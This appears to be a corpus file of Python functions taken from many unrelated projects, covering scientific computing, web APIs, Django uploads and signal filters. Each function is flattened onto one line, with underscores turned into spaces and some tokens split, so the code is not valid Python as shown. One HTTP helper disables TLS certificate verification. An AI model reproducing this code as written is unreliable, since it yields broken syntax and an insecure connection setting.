None if crl policy ref : result = Core Foundation . CF Release ( crl policy ref ) handle cf error ( result ) crl policy ref = None if ocsp policy ref : result = Core Foundation . CF Release ( ocsp policy ref ) handle cf error ( result ) ocsp policy ref = None if policy array ref : result = Core Foundation . CF Release ( policy array ref ) handle cf error ( result ) policy array ref = None
def close ( self ) : try : self . shutdown ( ) finally : if self . socket : try : self . socket . close ( ) except ( socket . error ) : pass self . socket = None if self . connection id in socket refs : del socket refs [ self . connection id ]
def version ( self ) : ver = Version ( ) ver . conn = self . conn ver . attrs = { # Parent params 'service id' : self . attrs [ 'id' ] , } ver . save ( ) return ver
def vcl ( self , name , content ) : vcl = VCL ( ) vcl . conn = self . conn vcl . attrs = { # Parent params 'service id' : self . attrs [ 'service id' ] , 'version' : self . attrs [ 'number' ] , # New instance params 'name' : name , 'content' : content , } vcl . save ( ) return vcl
def patch ( self , route , data , headers = None , failure message = None ) : headers = self . get headers ( headers ) response lambda = ( lambda : requests . patch ( self . get qualified route ( route ) , headers = headers , data = data , verify = False , proxies = self . proxies ) ) response = check for rate limiting ( response lambda ( ) , response lambda ) return self . handle response ( response , failure message )
def add organization course ( organization data , course key ) : validate course key ( course key ) validate organization data ( organization data ) data . create organization course ( organization = organization data , course key = course key )
def remove organization course ( organization , course key ) : validate organization data ( organization ) validate course key ( course key ) return data . delete organization course ( course key = course key , organization = organization )
def course key is valid ( course key ) : if course key is None : return False try : Course Key . from string ( text type ( course key ) ) except ( Invalid Key Error , Unicode Decode Error ) : return False return True
def inactivate organization ( organization ) : [ inactivate organization course relationship ( record ) for record in internal . Organization Course . objects . filter ( organization id = organization . id , active = True ) ] [ inactivate record ( record ) for record in internal . Organization . objects . filter ( id = organization . id , active = True ) ]
def activate organization course relationship ( relationship ) : # pylint: disable=invalid-name # If the relationship doesn't exist or the organization isn't active we'll want to raise an error relationship = internal . Organization Course . objects . get ( id = relationship . id , active = False , organization active = True ) activate record ( relationship )
def inactivate organization course relationship ( relationship ) : # pylint: disable=invalid-name relationship = internal . Organization Course . objects . get ( id = relationship . id , active = True ) inactivate record ( relationship )
def fetch organization courses ( organization ) : organization obj = serializers . deserialize organization ( organization ) queryset = internal . Organization Course . objects . filter ( organization = organization obj , active = True ) . select related ( 'organization' ) return [ serializers . serialize organization with course ( organization ) for organization in queryset ]
def fetch course organizations ( course key ) : queryset = internal . Organization Course . objects . filter ( course id = text type ( course key ) , active = True ) . select related ( 'organization' ) return [ serializers . serialize organization with course ( organization ) for organization in queryset ]
def serialize organization ( organization ) : return { 'id' : organization . id , 'name' : organization . name , 'short name' : organization . short name , 'description' : organization . description , 'logo' : organization . logo }
def deserialize organization ( organization dict ) : return models . Organization ( id = organization dict . get ( 'id' ) , name = organization dict . get ( 'name' , '' ) , short name = organization dict . get ( 'short name' , '' ) , description = organization dict . get ( 'description' , '' ) , logo = organization dict . get ( 'logo' , '' ) )
def get video ( self , node ) : video = Video ( ) video . embed code = self . get embed code ( node ) video . embed type = self . get embed type ( node ) video . width = self . get width ( node ) video . height = self . get height ( node ) video . src = self . get src ( node ) video . provider = self . get provider ( video . src ) return video
def get siblings content ( self , current sibling , baselinescore siblings para ) : if current sibling . tag == 'p' and self . parser . get Text ( current sibling ) : tmp = current sibling if tmp . tail : tmp = deepcopy ( tmp ) tmp . tail = '' return [ tmp ] else : potential paragraphs = self . parser . get Elements By Tag ( current sibling , tag = 'p' ) if potential paragraphs is None : return None paragraphs = list ( ) for first paragraph in potential paragraphs : text = self . parser . get Text ( first paragraph ) if text : # no len(text) > 0 word stats = self . stopwords class ( language = self . get language ( ) ) . get stopword count ( text ) paragraph score = word stats . get stopword count ( ) sibling baseline score = float ( .30 ) high link density = self . is highlink density ( first paragraph ) score = float ( baselinescore siblings para * sibling baseline score ) if score < paragraph score and not high link density : para = self . parser . create Element ( tag = 'p' , text = text , tail = None ) paragraphs . append ( para ) return paragraphs
def get canonical link ( self ) : if self . article . final url : kwargs = { 'tag' : 'link' , 'attr' : 'rel' , 'value' : 'canonical' } meta = self . parser . get Elements By Tag ( self . article . doc , * * kwargs ) if meta is not None and len ( meta ) > 0 : href = self . parser . get Attribute ( meta [ 0 ] , 'href' ) if href : href = href . strip ( ) o = urlparse ( href ) if not o . hostname : tmp = urlparse ( self . article . final url ) domain = '%s://%s' % ( tmp . scheme , tmp . hostname ) href = urljoin ( domain , href ) return href return self . article . final url
def make list elms pretty ( self ) : for elm in self . parser . get Elements By Tag ( self . top node , tag = 'li' ) : elm . text = r' {}'.f o rmat(e l m.t e xt)
def crawl ( self , crawl candidate ) : def crawler wrapper ( parser , parsers lst , crawl candidate ) : try : crawler = Crawler ( self . config , self . fetcher ) article = crawler . crawl ( crawl candidate ) except ( Unicode Decode Error , Value Error ) as ex : if parsers lst : parser = parsers lst . pop ( 0 ) # remove it also! return crawler wrapper ( parser , parsers lst , crawl candidate ) else : raise ex return article # use the wrapper parsers = list ( self . config . available parsers ) parsers . remove ( self . config . parser class ) return crawler wrapper ( self . config . parser class , parsers , crawl candidate )
def get urls ( self ) : urls = patterns ( '' , url ( r'^upload/$' , self . admin site . admin view ( self . handle upload ) , name = 'quill-file-upload' ) , ) return urls + super ( Quill Admin , self ) . get urls ( )
def handle upload ( self , request ) : if request . method != 'POST' : raise Http404 if request . is ajax ( ) : try : filename = request . GET [ 'quill Upload File' ] data = request is raw = True except Key Error : return Http Response Bad Request ( "Invalid file upload." ) else : if len ( request . FILES ) != 1 : return Http Response Bad Request ( "Can only upload 1 file at a time." ) try : data = request . FILES [ 'quill Upload File' ] filename = data . name is raw = False except Key Error : return Http Response Bad Request ( 'Missing image `quill Upload File`.' ) url = save file ( data , filename , is raw , default storage ) response data = { } response data [ 'url' ] = url # Response content type needs to be text/html here or else # IE will try to download the file. return Http Response ( json . dumps ( response data ) , content type = "text/html; charset=utf-8" )
def render ( self , name , value , attrs = { } ) : if value is None : value = '' final attrs = self . build attrs ( attrs , name = name ) quill app = apps . get app config ( 'quill' ) quill config = getattr ( quill app , self . config ) return mark safe ( render to string ( quill config [ 'template' ] , { 'final attrs' : flatatt ( final attrs ) , 'value' : value , 'id' : final attrs [ 'id' ] , 'config' : self . config , } ) )
def formfield ( self , * * kwargs ) : defaults = { 'form class' : Rich Text Form Field , 'config' : self . config , } defaults . update ( kwargs ) return super ( Rich Text Field , self ) . formfield ( * * defaults )
def render toolbar ( context , config ) : quill config = getattr ( quill app , config ) t = template . loader . get template ( quill config [ 'toolbar template' ] ) return t . render ( context )
def get meta image url ( request , image ) : rendition = image . get rendition ( filter = 'original' ) return request . build absolute uri ( rendition . url )
def read ( self , filename = None ) : self . init filename ( filename ) def BLANK ( i ) : return "B{0:04d}" . format ( i ) def COMMENT ( i ) : return "C{0:04d}" . format ( i ) data = odict ( ) iblank = icomment = 0 with open ( self . real filename ) as mdp : for line in mdp : line = line . strip ( ) if len ( line ) == 0 : iblank += 1 data [ BLANK ( iblank ) ] = '' continue m = self . COMMENT . match ( line ) if m : icomment += 1 data [ COMMENT ( icomment ) ] = m . group ( 'value' ) continue # parameter m = self . PARAMETER . match ( line ) if m : # check for comments after parameter?? -- currently discarded parameter = m . group ( 'parameter' ) value = self . transform ( m . group ( 'value' ) ) data [ parameter ] = value else : errmsg = '{filename!r}: unknown line in mdp file, {line!r}' . format ( * * vars ( ) ) self . logger . error ( errmsg ) raise Parse Error ( errmsg ) super ( MDP , self ) . update ( data )
def prehook ( self , * * kwargs ) : cmd = [ 'smpd' , '-s' ] logger . info ( "Starting smpd: " + " " . join ( cmd ) ) rc = subprocess . call ( cmd ) return rc
def glob parts ( prefix , ext ) : if ext . startswith ( '.' ) : ext = ext [ 1 : ] files = glob . glob ( prefix + '.' + ext ) + glob . glob ( prefix + '.part[0-9][0-9][0-9][0-9].' + ext ) files . sort ( ) # at least some rough sorting... return files
def mdp include string ( dirs ) : include paths = [ os . path . expanduser ( p ) for p in dirs ] return ' -I' . join ( [ '' ] + include paths )
def parse groups ( output ) : groups = [ ] for line in output . split ( '\n' ) : m = NDXGROUP . match ( line ) if m : d = m . groupdict ( ) groups . append ( { 'name' : d [ 'GROUPNAME' ] , 'nr' : int ( d [ 'GROUPNUMBER' ] ) , 'natoms' : int ( d [ 'NATOMS' ] ) } ) return groups
def delete frames ( self ) : for frame in glob . glob ( self . frameglob ) : os . unlink ( frame )
def gmx resid ( self , resid ) : try : gmx resid = int ( self . offset [ resid ] ) except ( Type Error , Index Error ) : gmx resid = resid + self . offset except Key Error : raise Key Error ( "offset must be a dict that contains the gmx resid for {0:d}" . format ( resid ) ) return gmx resid
def process command ( self , command , name = None ) : self . command counter += 1 if name is None : name = "CMD{0:03d}" . format ( self . command counter ) # Need to build it with two make ndx calls because I cannot reliably # name the new group without knowing its number. try : fd , tmp ndx = tempfile . mkstemp ( suffix = '.ndx' , prefix = 'tmp ' + name + ' ' ) cmd = [ command , '' , 'q' ] # empty command '' necessary to get list # This sometimes fails with 'OS Error: Broken Pipe' --- hard to debug rc , out , err = self . make ndx ( o = tmp ndx , input = cmd ) self . check output ( out , "No atoms found for selection {command!r}." . format ( * * vars ( ) ) , err = err ) # For debugging, look at out and err or set stdout=True, stderr=True # TODO: check '  0 r 300 & ALA & O     :     1 atoms' has at least 1 atom ##print "DEBUG:  process command()" ##print out groups = parse ndxlist ( out ) last = groups [ - 1 ] # reduce and name this group fd , ndx = tempfile . mkstemp ( suffix = '.ndx' , prefix = name + ' ' ) name cmd = [ "keep {0:d}" . format ( last [ 'nr' ] ) , "name 0 {0!s}" . format ( name ) , 'q' ] rc , out , err = self . make ndx ( n = tmp ndx , o = ndx , input = name cmd ) finally : utilities . unlink gmx ( tmp ndx ) return name , ndx
def translate residue ( self , selection , default atomname = 'CA' ) : m = self . RESIDUE . match ( selection ) if not m : errmsg = "Selection {selection!r} is not valid." . format ( * * vars ( ) ) logger . error ( errmsg ) raise Value Error ( errmsg ) gmx resid = self . gmx resid ( int ( m . group ( 'resid' ) ) ) # magic offset correction residue = m . group ( 'aa' ) if len ( residue ) == 1 : gmx resname = utilities . convert aa code ( residue ) # only works for AA else : gmx resname = residue # use 3-letter for any resname gmx atomname = m . group ( 'atom' ) if gmx atomname is None : gmx atomname = default atomname return { 'resname' : gmx resname , 'resid' : gmx resid , 'atomname' : gmx atomname }
def check output ( self , make ndx output , message = None , err = None ) : if message is None : message = "" else : message = '\n' + message def format ( output , w = 60 ) : hrule = "====[ Gromacs Error (diagnostic output) ]" . ljust ( w , "=" ) return hrule + '\n' + str ( output ) + hrule rc = True if self . is empty group ( make ndx output ) : warnings . warn ( "Selection produced empty group.{message!s}" . format ( * * vars ( ) ) , category = Gromacs Value Warning ) rc = False if self . has syntax error ( make ndx output ) : rc = False out formatted = format ( make ndx output ) raise Gromacs Error ( "make ndx encountered a Syntax Error, " "%(message)s\noutput:\n%(out formatted)s" % vars ( ) ) if make ndx output . strip ( ) == "" : rc = False out formatted = format ( err ) raise Gromacs Error ( "make ndx produced no output, " "%(message)s\nerror output:\n%(out formatted)s" % vars ( ) ) return rc
def get template ( t ) : if os . path . exists ( t ) : # 1) Is it an accessible file? pass else : t = t t found = False for d in path : # 2) search config.path p = os . path . join ( d , t ) if os . path . exists ( p ) : t = p t found = True break t = os . path . basename ( t ) if not t found : # 3) try template dirs for p in templates . values ( ) : if t == os . path . basename ( p ) : t = p t found = True # NOTE: in principle this could match multiple break #       times if more than one template dir existed. if not t found : # 4) try it as a key into templates try : t = templates [ t ] except Key Error : pass else : t found = True if not t found : # 5) nothing else to try... raise Value Error ( "Failed to locate the template file {t!r}." . format ( * * vars ( ) ) ) return os . path . realpath ( t )
def getpath ( self , section , option ) : return os . path . expanduser ( os . path . expandvars ( self . get ( section , option ) ) )
def canonicalize ( self , filename ) : path , ext = os . path . splitext ( filename ) if not ext : ext = ".collection" return path + ext
def to int64 ( a ) : # build new dtype and replace i4 --> i8 def promote i4 ( typestr ) : if typestr [ 1 : ] == 'i4' : typestr = typestr [ 0 ] + 'i8' return typestr dtype = [ ( name , promote i4 ( typestr ) ) for name , typestr in a . dtype . descr ] return a . astype ( dtype )
def combine arglist ( self , args , kwargs ) : args = self . args + args kwargs = self . kwargs . copy ( ) kwargs . update ( kwargs ) return args , kwargs
def transform args ( self , * args , * * kwargs ) : options = [ ] for option , value in kwargs . items ( ) : if not option . startswith ( '-' ) : # heuristic for turning key=val pairs into options # (fails for commands such as 'find' -- then just use args) if len ( option ) == 1 : option = '-' + option # POSIX style else : option = '--' + option # GNU option if value is True : options . append ( option ) continue elif value is False : raise Value Error ( 'A False value is ambiguous for option {0!r}' . format ( option ) ) if option [ : 2 ] == '--' : options . append ( option + '=' + str ( value ) ) # GNU option else : options . extend ( ( option , str ( value ) ) ) # POSIX style return options + list ( args )
def help ( self , long = False ) : print ( "\ncommand: {0!s}\n\n" . format ( self . command name ) ) print ( self . doc ) if long : print ( "\ncall method: command():\n" ) print ( self . call . doc )
def combine arglist ( self , args , kwargs ) : gmxargs = self . gmxargs . copy ( ) gmxargs . update ( self . combineargs ( * args , * * kwargs ) ) return ( ) , gmxargs
def combineargs ( self , * args , * * kwargs ) : d = { arg : True for arg in args } # switches are kwargs with value True d . update ( kwargs ) return d
def build arg list ( self , * * kwargs ) : arglist = [ ] for flag , value in kwargs . items ( ) : # XXX: check flag against allowed values flag = str ( flag ) if flag . startswith ( ' ' ) : flag = flag [ 1 : ] # python-illegal keywords are ' '-quoted if not flag . startswith ( '-' ) : flag = '-' + flag # now flag is guaranteed to start with '-' if value is True : arglist . append ( flag ) # simple command line flag elif value is False : if flag . startswith ( '-no' ) : # negate a negated flag ('no X=False' --> X=True --> -X ... but who uses that?) arglist . append ( '-' + flag [ 3 : ] ) else : arglist . append ( '-no' + flag [ 1 : ] ) # gromacs switches booleans by prefixing 'no' elif value is None : pass # ignore flag = None else : try : arglist . extend ( [ flag ] + value ) # option with value list except Type Error : arglist . extend ( [ flag , value ] ) # option with single value return list ( map ( str , arglist ) )
def run command ( self , * args , * * kwargs ) : result , p = super ( Gromacs Command , self ) . run command ( * args , * * kwargs ) self . check failure ( result , command string = p . command string ) return result , p
def transform args ( self , * args , * * kwargs ) : newargs = self . combineargs ( * args , * * kwargs ) return self . build arg list ( * * newargs )
def get stream ( filename , openfunction = open , mode = 'r' ) : try : stream = openfunction ( filename , mode = mode ) except ( IO Error , OS Error ) as err : # An exception might be raised due to two reasons, first the openfunction is unable to open the file, in this # case we have to ignore the error and return None. Second is when openfunction can't open the file because # either the file isn't there or the permissions don't allow access. if errno . errorcode [ err . errno ] in [ 'ENOENT' , 'EACCES' ] : six . reraise ( * sys . exc info ( ) ) return None if mode . startswith ( 'r' ) : # additional check for reading (eg can we uncompress) --- is this needed? try : stream . readline ( ) except IO Error : stream . close ( ) stream = None except : stream . close ( ) raise else : stream . close ( ) stream = openfunction ( filename , mode = mode ) return stream
def convert aa code ( x ) : if len ( x ) == 1 : return amino acid codes [ x . upper ( ) ] elif len ( x ) == 3 : return inverse aa codes [ x . upper ( ) ] else : raise Value Error ( "Can only convert 1-letter or 3-letter amino acid codes, " "not %r" % x )
def iterable ( obj ) : if isinstance ( obj , string types ) : return False # avoid iterating over characters of a string if hasattr ( obj , 'next' ) : return True # any iterator will do try : len ( obj ) # anything else that might work except Type Error : return False return True
def unlink f ( path ) : try : os . unlink ( path ) except OS Error as err : if err . errno != errno . ENOENT : raise
def infix filename ( self , name , default , infix , ext = None ) : if name is None : p , oldext = os . path . splitext ( default ) if ext is None : ext = oldext if ext . startswith ( os . extsep ) : ext = ext [ 1 : ] name = self . filename ( p + infix , ext = ext ) return name
def stop logging ( ) : from . import log logger = logging . get Logger ( "gromacs" ) logger . info ( "Gromacs Wrapper %s STOPPED logging" , get version ( ) ) log . clear handlers ( logger )
def tool factory ( clsname , name , driver , base = Gromacs Command ) : clsdict = { 'command name' : name , 'driver' : driver , ' doc ' : property ( base . get gmx docs ) } return type ( clsname , ( base , ) , clsdict )
def read ( self , filename = None ) : self . init filename ( filename ) data = odict ( ) with open ( self . real filename ) as ndx : current section = None for line in ndx : line = line . strip ( ) if len ( line ) == 0 : continue m = self . SECTION . match ( line ) if m : current section = m . group ( 'name' ) data [ current section ] = [ ] # can fail if name not legal python key continue if current section is not None : data [ current section ] . extend ( map ( int , line . split ( ) ) ) super ( NDX , self ) . update ( odict ( [ ( name , self . transform ( atomnumbers ) ) for name , atomnumbers in data . items ( ) ] ) )
def assemble topology ( self ) : self . logger . debug ( "starting to assemble topology..." ) top = '' self . logger . debug ( "making atom/pair/bond/angle/dihedral/improper types" ) top += self . toptemplate top = top . replace ( '*DEFAULTS*' , '' . join ( self . make defaults ( self . system ) ) ) top = top . replace ( '*ATOMTYPES*' , '' . join ( self . make atomtypes ( self . system ) ) ) top = top . replace ( '*NONBOND PARAM*' , '' . join ( self . make nonbond param ( self . system ) ) ) top = top . replace ( '*PAIRTYPES*' , '' . join ( self . make pairtypes ( self . system ) ) ) top = top . replace ( '*BONDTYPES*' , '' . join ( self . make bondtypes ( self . system ) ) ) top = top . replace ( '*CONSTRAINTTYPES*' , '' . join ( self . make constrainttypes ( self . system ) ) ) top = top . replace ( '*ANGLETYPES*' , '' . join ( self . make angletypes ( self . system ) ) ) top = top . replace ( '*DIHEDRALTYPES*' , '' . join ( self . make dihedraltypes ( self . system ) ) ) top = top . replace ( '*IMPROPERTYPES*' , '' . join ( self . make impropertypes ( self . system ) ) ) top = top . replace ( '*CMAPTYPES*' , '' . join ( self . make cmaptypes ( self . system ) ) ) for i , ( molname , m ) in enumerate ( self . system . dict molname mol . items ( ) ) : itp = self . itptemplate itp = itp . replace ( '*MOLECULETYPE*' , '' . join ( self . make moleculetype ( m , molname , m . exclusion numb ) ) ) itp = itp . replace ( '*ATOMS*' , '' . join ( self . make atoms ( m ) ) ) itp = itp . replace ( '*BONDS*' , '' . join ( self . make bonds ( m ) ) ) itp = itp . replace ( '*PAIRS*' , '' . join ( self . make pairs ( m ) ) ) itp = itp . replace ( '*SETTLES*' , '' . join ( self . make settles ( m ) ) ) itp = itp . replace ( '*VIRTUAL SITES3*' , '' . join ( self . make virtual sites3 ( m ) ) ) itp = itp . replace ( '*EXCLUSIONS*' , '' . join ( self . make exclusions ( m ) ) ) itp = itp . replace ( '*ANGLES*' , '' . join ( self . make angles ( m ) ) ) itp = itp . replace ( '*DIHEDRALS*' , '' . join ( self . make dihedrals ( m ) ) ) itp = itp . replace ( '*IMPROPERS*' , '' . join ( self . make impropers ( m ) ) ) itp = itp . replace ( '*CMAPS*' , '' . join ( self . make cmaps ( m ) ) ) if not self . multiple output : top += itp else : outfile = "mol {0}.itp" . format ( molname ) top += '#include "mol {0}.itp" \n' . format ( molname ) with open ( outfile , "w" ) as f : f . writelines ( [ itp ] ) top += '\n[system]  \n Converted System\n\n' top += '[molecules] \n' molecules = [ ( "" , 0 ) ] for m in self . system . molecules : if ( molecules [ - 1 ] [ 0 ] != m . name ) : molecules . append ( [ m . name , 0 ] ) if molecules [ - 1 ] [ 0 ] == m . name : molecules [ - 1 ] [ 1 ] += 1 for molname , n in molecules [ 1 : ] : top += '{0:s}     {1:d}\n' . format ( molname , n ) top += '\n' with open ( self . outfile , 'w' ) as f : f . writelines ( [ top ] )
def check mdpargs ( d ) : if len ( d ) > 0 : wmsg = "Unprocessed mdp option are interpreted as options for grompp:\n" + str ( d ) logger . warn ( wmsg ) warnings . warn ( wmsg , category = Usage Warning ) return len ( d ) == 0
def is Mine ( self , scriptname ) : suffix = os . path . splitext ( scriptname ) [ 1 ] . lower ( ) if suffix . startswith ( '.' ) : suffix = suffix [ 1 : ] return self . suffix == suffix
def anumb to atom ( self , anumb ) : assert isinstance ( anumb , int ) , "anumb must be integer" if not self . anumb to atom : # empty dictionary if self . atoms : for atom in self . atoms : self . anumb to atom [ atom . number ] = atom return self . anumb to atom [ anumb ] else : self . logger ( "no atoms in the molecule" ) return False else : if anumb in self . anumb to atom : return self . anumb to atom [ anumb ] else : self . logger ( "no such atom number ({0:d}) in the molecule" . format ( anumb ) ) return False
def total regular pixels from mask ( mask ) : total regular pixels = 0 for y in range ( mask . shape [ 0 ] ) : for x in range ( mask . shape [ 1 ] ) : if not mask [ y , x ] : total regular pixels += 1 return total regular pixels
def mask circular from shape pixel scale and radius ( shape , pixel scale , radius arcsec , centre = ( 0.0 , 0.0 ) ) : mask = np . full ( shape , True ) centres arcsec = mask centres from shape pixel scale and centre ( shape = mask . shape , pixel scale = pixel scale , centre = centre ) for y in range ( mask . shape [ 0 ] ) : for x in range ( mask . shape [ 1 ] ) : y arcsec = ( y - centres arcsec [ 0 ] ) * pixel scale x arcsec = ( x - centres arcsec [ 1 ] ) * pixel scale r arcsec = np . sqrt ( x arcsec ** 2 + y arcsec ** 2 ) if r arcsec <= radius arcsec : mask [ y , x ] = False return mask
def mask circular annular from shape pixel scale and radii ( shape , pixel scale , inner radius arcsec , outer radius arcsec , centre = ( 0.0 , 0.0 ) ) : mask = np . full ( shape , True ) centres arcsec = mask centres from shape pixel scale and centre ( shape = mask . shape , pixel scale = pixel scale , centre = centre ) for y in range ( mask . shape [ 0 ] ) : for x in range ( mask . shape [ 1 ] ) : y arcsec = ( y - centres arcsec [ 0 ] ) * pixel scale x arcsec = ( x - centres arcsec [ 1 ] ) * pixel scale r arcsec = np . sqrt ( x arcsec ** 2 + y arcsec ** 2 ) if outer radius arcsec >= r arcsec >= inner radius arcsec : mask [ y , x ] = False return mask
def mask elliptical from shape pixel scale and radius ( shape , pixel scale , major axis radius arcsec , axis ratio , phi , centre = ( 0.0 , 0.0 ) ) : mask = np . full ( shape , True ) centres arcsec = mask centres from shape pixel scale and centre ( shape = mask . shape , pixel scale = pixel scale , centre = centre ) for y in range ( mask . shape [ 0 ] ) : for x in range ( mask . shape [ 1 ] ) : y arcsec = ( y - centres arcsec [ 0 ] ) * pixel scale x arcsec = ( x - centres arcsec [ 1 ] ) * pixel scale r arcsec elliptical = elliptical radius from y x phi and axis ratio ( y arcsec , x arcsec , phi , axis ratio ) if r arcsec elliptical <= major axis radius arcsec : mask [ y , x ] = False return mask
def mask elliptical annular from shape pixel scale and radius ( shape , pixel scale , inner major axis radius arcsec , inner axis ratio , inner phi , outer major axis radius arcsec , outer axis ratio , outer phi , centre = ( 0.0 , 0.0 ) ) : mask = np . full ( shape , True ) centres arcsec = mask centres from shape pixel scale and centre ( shape = mask . shape , pixel scale = pixel scale , centre = centre ) for y in range ( mask . shape [ 0 ] ) : for x in range ( mask . shape [ 1 ] ) : y arcsec = ( y - centres arcsec [ 0 ] ) * pixel scale x arcsec = ( x - centres arcsec [ 1 ] ) * pixel scale inner r arcsec elliptical = elliptical radius from y x phi and axis ratio ( y arcsec , x arcsec , inner phi , inner axis ratio ) outer r arcsec elliptical = elliptical radius from y x phi and axis ratio ( y arcsec , x arcsec , outer phi , outer axis ratio ) if inner r arcsec elliptical >= inner major axis radius arcsec and outer r arcsec elliptical <= outer major axis radius arcsec : mask [ y , x ] = False return mask
def total edge pixels from mask ( mask ) : border pixel total = 0 for y in range ( mask . shape [ 0 ] ) : for x in range ( mask . shape [ 1 ] ) : if not mask [ y , x ] : if mask [ y + 1 , x ] or mask [ y - 1 , x ] or mask [ y , x + 1 ] or mask [ y , x - 1 ] or mask [ y + 1 , x + 1 ] or mask [ y + 1 , x - 1 ] or mask [ y - 1 , x + 1 ] or mask [ y - 1 , x - 1 ] : border pixel total += 1 return border pixel total
def total border pixels from mask and edge pixels ( mask , edge pixels , masked grid index to pixel ) : border pixel total = 0 for i in range ( edge pixels . shape [ 0 ] ) : if check if border pixel ( mask , edge pixels [ i ] , masked grid index to pixel ) : border pixel total += 1 return border pixel total
def grid stack from deflection stack ( grid stack , deflection stack ) : if deflection stack is not None : def minus ( grid , deflections ) : return grid - deflections return grid stack . map function ( minus , deflection stack )
def regular to pix ( self ) : return mapper util . voronoi regular to pix from grids and geometry ( regular grid = self . grid stack . regular , regular to nearest pix = self . grid stack . pix . regular to nearest pix , pixel centres = self . geometry . pixel centres , pixel neighbors = self . geometry . pixel neighbors , pixel neighbors size = self . geometry . pixel neighbors size ) . astype ( 'int' )
def sub to pix ( self ) : return mapper util . voronoi sub to pix from grids and geometry ( sub grid = self . grid stack . sub , regular to nearest pix = self . grid stack . pix . regular to nearest pix , sub to regular = self . grid stack . sub . sub to regular , pixel centres = self . geometry . pixel centres , pixel neighbors = self . geometry . pixel neighbors , pixel neighbors size = self . geometry . pixel neighbors size ) . astype ( 'int' )
def signal to noise map ( self ) : signal to noise map = np . divide ( self . image , self . noise map ) signal to noise map [ signal to noise map < 0 ] = 0 return signal to noise map
def absolute signal to noise map ( self ) : return np . divide ( np . abs ( self . image ) , self . noise map )
def simulate as gaussian ( cls , shape , pixel scale , sigma , centre = ( 0.0 , 0.0 ) , axis ratio = 1.0 , phi = 0.0 ) : from autolens . model . profiles . light profiles import Elliptical Gaussian gaussian = Elliptical Gaussian ( centre = centre , axis ratio = axis ratio , phi = phi , intensity = 1.0 , sigma = sigma ) grid 1d = grid util . regular grid 1d masked from mask pixel scales and origin ( mask = np . full ( shape , False ) , pixel scales = ( pixel scale , pixel scale ) ) gaussian 1d = gaussian . intensities from grid ( grid = grid 1d ) gaussian 2d = mapping util . map unmasked 1d array to 2d array from array 1d and shape ( array 1d = gaussian 1d , shape = shape ) return PSF ( array = gaussian 2d , pixel scale = pixel scale , renormalize = True )
def new psf with renormalized array ( self ) : return PSF ( array = self , pixel scale = self . pixel scale , renormalize = True )
def map function ( self , func , * arg lists ) : return Grid Stack ( * [ func ( * args ) for args in zip ( self , * arg lists ) ] )
def yticks ( self ) : return np . linspace ( np . min ( self [ : , 0 ] ) , np . max ( self [ : , 0 ] ) , 4 )
def xticks ( self ) : return np . linspace ( np . min ( self [ : , 1 ] ) , np . max ( self [ : , 1 ] ) , 4 )
def unmasked sparse to sparse ( self ) : return mapping util . unmasked sparse to sparse from mask and pixel centres ( mask = self . regular grid . mask , unmasked sparse grid pixel centres = self . unmasked sparse grid pixel centres , total sparse pixels = self . total sparse pixels ) . astype ( 'int' )
def sparse to unmasked sparse ( self ) : return mapping util . sparse to unmasked sparse from mask and pixel centres ( total sparse pixels = self . total sparse pixels , mask = self . regular grid . mask , unmasked sparse grid pixel centres = self . unmasked sparse grid pixel centres ) . astype ( 'int' )
def regular to sparse ( self ) : return mapping util . regular to sparse from sparse mappings ( regular to unmasked sparse = self . regular to unmasked sparse , unmasked sparse to sparse = self . unmasked sparse to sparse ) . astype ( 'int' )
def trace grid stack to next plane ( self ) : def minus ( grid , deflections ) : return grid - deflections return self . grid stack . map function ( minus , self . deflection stack )
def trace to next plane ( self ) : return list ( map ( lambda positions , deflections : np . subtract ( positions , deflections ) , self . positions , self . deflections ) )
def contained in ( filename , directory ) : filename = os . path . normcase ( os . path . abspath ( filename ) ) directory = os . path . normcase ( os . path . abspath ( directory ) ) return os . path . commonprefix ( [ filename , directory ] ) == directory
def build backend ( ) : # Add in-tree backend directories to the front of sys.path. backend path = os . environ . get ( 'PEP517 BACKEND PATH' ) if backend path : extra pathitems = backend path . split ( os . pathsep ) sys . path [ : 0 ] = extra pathitems ep = os . environ [ 'PEP517 BUILD BACKEND' ] mod path , , obj path = ep . partition ( ':' ) try : obj = import module ( mod path ) except Import Error : raise Backend Unavailable ( traceback . format exc ( ) ) if backend path : if not any ( contained in ( obj . file , path ) for path in extra pathitems ) : raise Backend Invalid ( "Backend was not loaded from backend-path" ) if obj path : for path part in obj path . split ( '.' ) : obj = getattr ( obj , path part ) return obj
def build sdist ( sdist directory , config settings ) : backend = build backend ( ) try : return backend . build sdist ( sdist directory , config settings ) except getattr ( backend , 'Unsupported Operation' , Dummy Exception ) : raise Got Unsupported Operation ( traceback . format exc ( ) )
def to JSON ( self ) : return { "id" : self . id , "compile" : self . compile , "position" : self . position , "version" : self . version }
def add model string ( self , model str , position = 1 , file id = None ) : if file id is None : file id = self . make unique id ( 'inlined input' ) ret data = self . file create ( File . from string ( model str , position , file id ) ) return ret data
def add model file ( self , model fpath , position = 1 , file id = None ) : if file id is None : file id = self . make unique id ( 'file input' ) ret data = self . file create ( File . from file ( model fpath , position , file id ) ) return ret data
def get is sim running ( self ) : sim info = self . simulation info ( ) try : progress info = sim info [ 'simulation info progress' ] ret = progress info [ 'simulation progress is running' ] except Key Error : # Simulation has not been created. ret = False return ret
def in out check ( self ) : devices = available devices ( ) if not self . in idx in devices : raise OS Error ( "Input device is unavailable" ) in check = devices [ self . in idx ] if not self . out idx in devices : raise OS Error ( "Output device is unavailable" ) out check = devices [ self . out idx ] if ( ( in check [ 'inputs' ] == 0 ) and ( out check [ 'outputs' ] == 0 ) ) : raise Standard Error ( 'Invalid input and output devices' ) elif ( in check [ 'inputs' ] == 0 ) : raise Value Error ( 'Selected input device has no inputs' ) elif ( out check [ 'outputs' ] == 0 ) : raise Value Error ( 'Selected output device has no outputs' ) return True
def up ( self , x ) : y = self . M * ssd . upsample ( x , self . M ) y = signal . lfilter ( self . b , self . a , y ) return y
def dn ( self , x ) : y = signal . lfilter ( self . b , self . a , x ) y = ssd . downsample ( y , self . M ) return y
def up ( self , x , L change = 12 ) : y = L change * ssd . upsample ( x , L change ) y = signal . lfilter ( self . b , [ 1 ] , y ) return y
def dn ( self , x , M change = 12 ) : y = signal . lfilter ( self . b , [ 1 ] , x ) y = ssd . downsample ( y , M change ) return y
def zplane ( self , auto scale = True , size = 2 , detect mult = True , tol = 0.001 ) : ssd . zplane ( self . b , [ 1 ] , auto scale , size , tol )
def filter ( self , x ) : y = signal . sosfilt ( self . sos , x ) return y
def up ( self , x , L change = 12 ) : y = L change * ssd . upsample ( x , L change ) y = signal . sosfilt ( self . sos , y ) return y
